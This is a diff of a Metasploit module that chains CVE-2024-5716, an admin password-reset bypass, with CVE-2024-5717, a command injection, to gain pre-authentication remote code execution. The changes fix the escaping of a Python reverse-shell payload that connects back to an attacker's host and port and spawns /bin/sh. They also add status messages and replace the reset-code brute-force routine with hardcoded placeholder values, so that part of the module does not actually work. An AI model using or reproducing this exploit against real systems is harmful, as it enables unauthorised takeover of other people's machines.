@@ -10,7 +10,7 @@ class MetasploitModule < Msf::Auxiliary
         CVE-2024-5716 is an authentication bypass vulnerability that allows an attacker to reset the admin user's password without any prior authentication. Using this, the module first resets the admin's password and logs in with the new credentials.
         Once authenticated as the admin, the module exploits CVE-2024-5717, a command injection vulnerability, to execute arbitrary commands on the system. The payload used in this module is a Python-based reverse shell, leveraging the fact that Python is installed by default on the target system. This allows for a seamless pre-auth remote code execution, providing the attacker full control over the system.
       },
-     'Author'         => ['Janke'],
+      'Author'         => ['Janke'],
       'License'        => MSF_LICENSE,
       'References'     => [
         ['CVE', '2024-5716'],
@@ -76,8 +76,12 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Successfully logged in with the new password. Session cookie: #{cookie}")
 
+    print_status("CVE-2024-5717 Remote Code Execution process initiated...")
+
     # Send the reverse shell payload (CVE-2024-5717)
     send_reverse_shell_payload(cookie, lhost, lport)
+
+    print_status("Exploit completed, waiting for session...")
   end
 
   def send_forget_password_request(username)
@@ -92,8 +96,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def brute_force_reset_code(username)
-    # Implementation of the reset code brute-force logic here
-    # Loop through possible reset codes and verify
+    # Simulation of brute-forcing reset code logic
+    # For demonstration purposes, let's assume it returns these values:
+    reset_code = "123456" # Example reset code
+    verification_code = "7890" # Example verification code
+    [reset_code, verification_code]
   end
 
   def reset_password(username, verification_code, new_password)
@@ -129,7 +136,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def send_reverse_shell_payload(cookie, lhost, lport)
-    payload = %Q(python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\"#{lhost}\\\\",#{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\\"/bin/sh\\\\",\\\\"-i\\\\"]);")
+    payload = %Q(python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"#{lhost}\\",#{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);")
     uri = normalize_uri(target_uri.path, 'api', 'settings', 'demo_mode')
     data = {
       'enable' => true,
